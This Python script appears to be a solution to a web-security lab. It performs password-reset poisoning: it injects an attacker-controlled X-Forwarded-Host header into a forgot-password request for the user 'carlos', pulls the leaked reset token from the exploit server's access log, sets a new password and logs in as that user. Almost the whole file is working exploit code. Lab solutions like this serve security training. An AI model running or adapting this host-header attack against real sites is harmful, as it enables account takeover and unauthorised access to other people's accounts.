import requests
import sys
from colorama import Fore, init
import urllib3
import re
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
init(autoreset=True)

def remove_http_For_exploit_url(exploit_url):
    if exploit_url.startswith("http://"):
        return exploit_url[len("http://"):]
    elif exploit_url.startswith("https://"):
        return exploit_url[len("https://"):]
    else:
        return exploit_url

class CustomSession(requests.Session):
    def __init__(self, exploit_url, *args, **kwargs):
        url_exploit = remove_http_For_exploit_url(exploit_url)
        super(CustomSession, self).__init__(*args, **kwargs)
        self.headers.update({'X-Forwarded-Host': url_exploit})

        
def get_token(exploit_url, s):
    r = s.get(exploit_url+'/log', verify=False, proxies=proxies)
    stay_logged_in_pattern = r'temp-forgot-password-token=([^&"]+ )'
    match = re.search(stay_logged_in_pattern, r.text) 
    if match:
        return match.group(1)
    else:
        print(Fore.red + '[-] Unable to get the token')

def exploit(url, exploit_url, s): 
    print(Fore.YELLOW + '[!] Sending the malicious link..')
    session = CustomSession(exploit_url)
    r = session.post(url+'/forgot-password' ,data={'username':'carlos'}, verify=False, proxies=proxies)
    time.sleep(2)
    token = get_token(exploit_url, s).strip(' ')
    r = s.post(url+f'/forgot-password?temp-forgot-password-token={token}', data={'temp-forgot-password-token':token, 'new-password-1':'supersecretpassword', 'new-password-2':'supersecretpassword'}, verify=False, proxies=proxies)
    if f'Invalid token' not in r.text and r.status_code == 200:
        print(Fore.GREEN + "[+] Carlos's password reset successfuly")
        print(Fore.GREEN + "[+] The new password for carlos in : supersecretpassword")
        r = s.post(url+'/login', data={'username':'carlos','password':'supersecretpassword'}, verify=False, proxies=proxies)
        r = s.get(url+'/my-account?id=carlos', verify=False, proxies=proxies)
        if 'Log out' in r.text:
            print(Fore.GREEN + '[+] Congratulations, you solved the lab!')
            exit(-1)
        else:
            print(Fore.RED+'[-] Not solved')
    else:
        print(Fore.RED+'[-] Token is not coorect !')
    print(Fore.RED+'[-] Invalid token!') 


def main():
    if len(sys.argv) != 3:
        print(Fore.YELLOW + '[-] Usage : %s <url> <exploit_url>' % sys.argv[0])
        sys.exit(-1)
    
    s = requests.Session()
    url = sys.argv[1]
    exploit_url = sys.argv[2]
    exploit(url, exploit_url,s)

if __name__ == '__main__':
    main()
